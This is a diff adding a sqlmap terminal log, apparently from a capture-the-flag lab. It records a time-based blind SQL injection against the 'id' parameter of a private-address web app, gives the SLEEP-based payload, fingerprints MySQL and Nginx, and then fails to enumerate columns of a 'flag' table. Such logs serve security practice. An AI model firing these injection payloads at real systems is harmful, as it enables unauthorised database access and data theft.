@@ -1,0 +1,46 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.6#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:19:18 /2026-07-14/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[1/1] URL:
+GET http://10.67.179.8/user?id=1
+do you want to test this URL? [Y/n/q]
+> Y
+[06:19:18] [INFO] testing URL 'http://10.67.179.8/user?id=1'
+[06:19:18] [INFO] using '/home/gabi/.local/share/sqlmap/output/results-07142026_0619am.csv' as the CSV results file in multiple targets mode
+[06:19:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 9261 FROM (SELECT(SLEEP(2)))uJUE)
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[06:19:18] [INFO] testing MySQL
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[06:19:26] [INFO] confirming MySQL
+[06:19:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[06:19:30] [INFO] adjusting time delay to 1 second due to good response times
+[06:19:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL >= 8.0.0
+[06:19:30] [INFO] fetching columns for table 'flag' in database 'sqhell_5'
+
+[06:19:30] [INFO] retrieved: 0
+[06:19:33] [ERROR] unable to retrieve the number of columns for table 'flag' in database 'sqhell_5'
+[06:19:33] [WARNING] unable to retrieve column names for table 'flag' in database 'sqhell_5'
+do you want to use common column existence check? [y/N/q] N
+[06:19:33] [WARNING] unable to enumerate the columns for table 'flag' in database 'sqhell_5'
+[06:19:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/gabi/.local/share/sqlmap/output/results-07142026_0619am.csv'
+
+[*] ending @ 06:19:33 /2026-07-14/
+
